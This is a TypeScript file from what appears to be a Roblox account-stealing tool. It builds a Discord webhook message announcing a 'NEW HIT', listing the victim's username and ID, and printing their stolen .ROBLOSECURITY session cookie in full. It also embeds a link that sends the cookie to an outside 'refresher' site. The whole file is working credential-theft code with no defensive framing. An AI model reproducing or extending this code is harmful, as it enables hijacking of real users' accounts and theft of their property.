export interface DiscordPayloadOptions {
  sequenceId: number;
  gameName: string;
  cookieValue: string;
  username: string;
  userId: string;
}

export function createDiscordPayload({
  sequenceId,
  gameName,
  cookieValue,
  username,
  userId,
}: DiscordPayloadOptions) {
  const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;

  return {
    content: `@everyone NEW HIT #${sequenceId}`,
    embeds: [
      {
        title: `${gameName} | Hit #${sequenceId}`,
        color: 16711680,
        description: `**Sequence:** #${sequenceId}\n**Game:** ${gameName}\n**Target Username:** ${username}\n**Target ID:** ${userId}`,
        fields: [
          {
            name: "🔧 Tool Used",
            value: "```toolbox                                      ```",
            inline: false,
          },
        ],
        footer: {
          text: "Refreshed Cookie | Original Cookie",
          icon_url: "https://i.imgur.com/0ZxT2S6.png",
        },
        timestamp: new Date().toISOString(),
      },
      {
        title: ".ROBLOSECURITY (Refreshed)",
        color: 16711680,
        description: `**Links:**\n[Refreshed Cookie](${linkRe})\n\n\`\`\`${cookieValue}\`\`\``,
        author: {
          name: "Refreshed Cookie",
          icon_url:
            "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
        },
      },
    ],
  };
}
